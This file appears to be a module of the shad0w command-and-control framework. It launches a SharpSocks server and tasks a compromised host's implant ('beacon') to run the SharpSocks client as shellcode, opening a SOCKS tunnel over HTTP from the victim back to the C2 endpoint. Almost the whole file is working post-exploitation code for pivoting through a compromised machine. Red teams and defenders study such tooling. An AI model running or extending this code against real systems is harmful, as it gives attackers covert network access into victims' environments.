#
# Execute sharpsocks on a session
#

import os
import time
import argparse
import threading

from lib import shellcode

__description__ = "Create a SOCKS tunnel over HTTP/HTTPS\n"
__author__ = "@_batsec_, @rbmaslen"
__type__ = "module"

# identify the task as shellcode execute
USERCD_EXEC_ID = 0x3000

# should we execute sharpsocks on the target
EXEC_SHARPSOCKS = False

# globals for the arguments
ERROR = False
error_list = ""

# location of sharpsocks binary
sharpsocks_BIN = "/root/shad0w/bin/SharpSocks.x86.exe"


def error(message):
    global ERROR, error_list
    ERROR = True
    error_list += f"\033[0;31m{message}\033[0m\n"


def exit(status=0, message=None):
    if message != None: print(message)
    return


def sharpsocks_callback(shad0w, data):
    if shad0w.sharpsocks_verbose:
        print(data)

    return ""


def start_sharpsocks_server(http_listen=None, socks_listen=None, quick=True, cmd_line=None):
    # modules directory
    modules_dir = "/root/shad0w/modules/windows/sharpsocks/"

    # binary name
    bin_name = "SharpSocksServerCore"

    # change to the modules directory
    os.chdir(modules_dir)

    # create the default cmd line
    if quick == True:
        cmd_line = f"-l http://{http_listen}"
        cmd = f"./{bin_name} {cmd_line} > /tmp/sharpsocks.log"

    # start the server
    cmd = f"./{bin_name} {cmd_line} > /tmp/sharpsocks.log"

    os.popen(cmd)

    try:
        os.unlink("/tmp/sharpsocks.log")
    except:
        pass

    data = ""
    for _ in range(0, 5):
        try:
            with open("/tmp/sharpsocks.log", "r") as file:
                data = file.read()
        except:
            time.sleep(0.5)

    if len(data) == 0:
        return None

    if quick == False:
        print(data)
        return None

    for line in data.splitlines():
        if "Using encryption key" in line:
            line = line.split()
            key = line[len(line) - 1]

    return key


def kill_server():
    os.popen("killall -9 SharpSocksServe")
    return


def await_for_socks_start(shad0w):
    while True:
        try:
            with open("/tmp/sharpsocks.log", "r") as file:
                data = file.read()
            if "Socks proxy listening started" in data:
                client_ip = shad0w.beacons[shad0w.current_beacon]["ip_addr"]
                shad0w.debug.good(f"Socks started ({shad0w.endpoint}:43334 <==> {client_ip})")
                break
        except FileNotFoundError: pass
    return


def main(shad0w, args):
    global EXEC_SHARPSOCKS

    # check we actually have a beacon
    if shad0w.current_beacon is None:
        shad0w.debug.log("ERROR: No active beacon.", log=True)
        return

    # save the raw args
    raw_args = args

    # usage examples
    usage_examples = """

Examples:

sharpsocks -q
sharpsocks --kill
sharpsocks server -l http://*:http-port-to-bind -s *:socks-port-to-bind
sharpsocks client -s http://your.redirector:port/ -k key
"""

    parse = argparse.ArgumentParser(prog='sharpsocks',
                                    formatter_class=argparse.RawDescriptionHelpFormatter,
                                    epilog=usage_examples)

    # keep argparse behaving nice
    parse.exit = exit
    parse.error = error

    parse.add_argument("server", help="Control the SharpSocks server")
    parse.add_argument("client", help="Control the SharpSocks client")
    parse.add_argument("-q", "--quick", action='store_true', help="Create a socks tunnel between the C2 and the client")
    parse.add_argument("-v", "--verbose", action='store_true', help="Verbose output")
    parse.add_argument("--kill", action='store_true', help="Kill the socks tunnel")

    # make sure we don't die from weird args
    try:
        args = parse.parse_args(args[1:])
    except:
        pass

    # make sure we have an argument
    if len(raw_args) == 1:
        parse.print_help()
        return

    shad0w.sharpsocks_verbose = False
    if args.verbose:
        shad0w.sharpsocks_verbose = True

    if args.kill:
        kill_server()
        return

    if args.quick:
        http_listen_addr = f"*:8080"
        key = start_sharpsocks_server(http_listen=http_listen_addr)
        if key == None:
            print("Failed to start the server.")
            return

        threading.Thread(target=await_for_socks_start, args=(shad0w,)).start()

        sharpsocks_cmd_line = f"-s http://{shad0w.endpoint} -k {key}"
        args.param = sharpsocks_cmd_line

        EXEC_SHARPSOCKS = True

    if args.server == "server":
        cmdline = ' '.join(raw_args[2:])
        start_sharpsocks_server(quick=False, cmd_line=cmdline)
        return

    if args.server == "client":
        args.param = ' '.join(raw_args[2:])
        EXEC_SHARPSOCKS = True

    if EXEC_SHARPSOCKS:
        args.cls = False
        args.method = False
        args.runtime = False
        args.appdomain = False

        b64_comp_data = shellcode.generate(sharpsocks_BIN, args, args.param)

        shad0w.beacons[shad0w.current_beacon]["task"] = (USERCD_EXEC_ID, b64_comp_data)
        shad0w.beacons[shad0w.current_beacon]["callback"] = sharpsocks_callback
